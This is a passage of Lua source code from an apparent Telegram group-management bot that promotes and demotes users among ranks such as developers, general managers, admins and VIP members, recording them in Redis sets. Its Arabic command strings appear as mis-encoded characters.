Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
Devmfm:srem(mustafa..'mfm:SudoBot:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'mfmconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^ุชูุฒูู ุงููู @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(ุชูุฒูู ุงููู) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุงุชุณุชุทูุน ุชูุฒูู ุงููุทูุฑ ุงูุงุณุงุณู", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.id_) then
secondsudo = 'ุงููุทูุฑูู ุงูุซุงููููู โข ' else secondsudo = '' end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',result.id_) then
sudobot = 'ุงููุทูุฑูู โข ' else sudobot = '' end
if Devmfm:sismember(mustafa..'mfm:ManagerAll:',result.id_) then
managerall = 'ุงููุฏุฑุงุก ุงูุนุงููู โข ' else managerall = '' end
if Devmfm:sismember(mustafa..'mfm:AdminAll:',result.id_) then
adminall = 'ุงูุงุฏูููู ุงูุนุงููู โข ' else adminall = '' end
if Devmfm:sismember(mustafa..'mfm:VipAll:',result.id_) then
vpall = 'ุงููููุฒูู ุงูุนุงููู โข ' else vpall = '' end
if Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'ุงูููุดุฆูู ุงูุงุณุงุณููู โข ' else basicconstructor = '' end
if Devmfm:sismember(mustafa..'mfm:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'ุงูููุดุฆูู โข ' else constructor = '' end 
if Devmfm:sismember(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_) then
manager = 'ุงููุฏุฑุงุก โข ' else manager = '' end
if Devmfm:sismember(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_) then
admins = 'ุงูุงุฏูููู โข ' else admins = '' end
if Devmfm:sismember(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'ุงููููุฒูู โข ' else vipmem = '' end
if Devmfm:sismember(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'ุงูููุธููู โข ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู โซ โค\n~ ( "..secondsudo..''..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","โ๏ธูู ุชุชู ุชุฑููุชู ูุณุจูุง")  
end 
if mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
Devmfm:srem(mustafa..'mfm:SecondSudo:', result.id_)
Devmfm:srem(mustafa..'mfm:SudoBot:', result.id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
Devmfm:srem(mustafa..'mfm:SudoBot:', result.id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'mfmconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Set SecondSudo     --
if Sudo(msg) then
if text ==('ุงุถู ูุทูุฑ ุซุงููู') or text ==('ุฑูุน ูุทูุฑ ุซุงููู') and ChCheck(msg) then
function sudo_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^ุงุถู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุฑูุน ูุทูุฑ ุซุงููู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงุถู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุฑูุน ูุทูุฑ ุซุงููู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุงุถู ูุทูุฑ ุซุงููู (%d+)') or text:match('^ุฑูุน ูุทูุฑ ุซุงููู (%d+)')) and ChCheck(msg) then
local user = text:match('ุงุถู ูุทูุฑ ุซุงููู (%d+)') or text:match('ุฑูุน ูุทูุฑ ุซุงููู (%d+)')
Devmfm:sadd(mustafa..'mfm:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end
--     Rem SecondSudo     --
if text ==('ุญุฐู ูุทูุฑ ุซุงููู') or text ==('ุชูุฒูู ูุทูุฑ ุซุงููู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^ุญุฐู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ ุซุงููู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุฐู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ ุซุงููู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุญุฐู ูุทูุฑ ุซุงููู (%d+)') or text:match('^ุชูุฒูู ูุทูุฑ ุซุงููู (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุฐู ูุทูุฑ ุซุงููู (%d+)') or text:match('ุชูุฒูู ูุทูุฑ ุซุงููู (%d+)')
Devmfm:srem(mustafa..'mfm:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end end
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('ุงุถู ูุทูุฑ') or text ==('ุฑูุน ูุทูุฑ') and ChCheck(msg) then
function sudo_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^ุงุถู ูุทูุฑ @(.*)') or text:match('^ุฑูุน ูุทูุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงุถู ูุทูุฑ @(.*)') or text:match('^ุฑูุน ูุทูุฑ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุงุถู ูุทูุฑ (%d+)') or text:match('^ุฑูุน ูุทูุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุงุถู ูุทูุฑ (%d+)') or text:match('ุฑูุน ูุทูุฑ (%d+)')
Devmfm:sadd(mustafa..'mfm:SudoBot:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end
--       Rem SudoBot      --
if text ==('ุญุฐู ูุทูุฑ') or text ==('ุชูุฒูู ูุทูุฑ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^ุญุฐู ูุทูุฑ @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุฐู ูุทูุฑ @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุญุฐู ูุทูุฑ (%d+)') or text:match('^ุชูุฒูู ูุทูุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุฐู ูุทูุฑ (%d+)') or text:match('ุชูุฒูู ูุทูุฑ (%d+)')
Devmfm:srem(mustafa..'mfm:SudoBot:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end end
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('ุฑูุน ูุฏูุฑ ุนุงู') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก ุงูุนุงููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ูุฏูุฑ ุนุงู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ูุฏูุฑ ุนุงู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก ุงูุนุงููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ูุฏูุฑ ุนุงู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ูุฏูุฑ ุนุงู (%d+)')
Devmfm:sadd(mustafa..'mfm:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก ุงูุนุงููู")  
end
--      Rem ManagerAll    --
if text ==('ุชูุฒูู ูุฏูุฑ ุนุงู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก ุงูุนุงููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ูุฏูุฑ ุนุงู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ูุฏูุฑ ุนุงู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก ุงูุนุงููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ูุฏูุฑ ุนุงู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ูุฏูุฑ ุนุงู (%d+)')
Devmfm:srem(mustafa..'mfm:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก ุงูุนุงููู")  
end end
--      Set adminall      --
if ManagerAll(msg) then
if text ==('ุฑูุน ุงุฏูู ุนุงู') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู ุงูุนุงููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ุงุฏูู ุนุงู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ุงุฏูู ุนุงู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู ุงูุนุงููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ุงุฏูู ุนุงู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ุงุฏูู ุนุงู (%d+)')
Devmfm:sadd(mustafa..'mfm:AdminAll:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู ุงูุนุงููู")  
end
--      Rem adminall      --
if text ==('ุชูุฒูู ุงุฏูู ุนุงู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู ุงูุนุงููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ุงุฏูู ุนุงู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ุงุฏูู ุนุงู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู ุงูุนุงููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ุงุฏูู ุนุงู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ุงุฏูู ุนุงู (%d+)')
Devmfm:srem(mustafa..'mfm:AdminAll:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู ุงูุนุงููู")  
end end
--       Set Vipall       --
if AdminAll(msg) then
if text ==('ุฑูุน ูููุฒ ุนุงู') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู ุงูุนุงู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ูููุฒ ุนุงู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ูููุฒ ุนุงู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู ุงูุนุงู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ูููุฒ ุนุงู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ูููุฒ ุนุงู (%d+)')
Devmfm:sadd(mustafa..'mfm:VipAll:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู ุงูุนุงู")  
end
--       Rem Vipall       --
if text ==('ุชูุฒูู ูููุฒ ุนุงู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู ุงูุนุงู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ูููุฒ ุนุงู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ูููุฒ ุนุงู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู ุงูุนุงู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ูููุฒ ุนุงู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ูููุฒ ุนุงู (%d+)')
Devmfm:srem(mustafa..'mfm:VipAll:',user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู ุงูุนุงู")  
end end
--  Set BasicConstructor  --
if ChatType == 'sp' or ChatType == 'gp'  then
if mfmConstructor(msg) then
if text ==('ุฑูุน ููุดุฆ ุงุณุงุณู') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ููุดุฆ ุงุณุงุณู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ููุดุฆ ุงุณุงุณู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ููุดุฆ ุงุณุงุณู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ููุดุฆ ุงุณุงุณู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ููุดุฆ ุงุณุงุณู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ููุดุฆ ุงุณุงุณู (%d+)')
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ููุดุฆ ุงุณุงุณู")  
end
--  Rem BasicConstructor  --
if text ==('ุชูุฒูู ููุดุฆ ุงุณุงุณู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ููุดุฆ ุงุณุงุณู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ููุดุฆ ุงุณุงุณู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ููุดุฆ ุงุณุงุณู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ููุดุฆ ุงุณุงุณู")  
else 
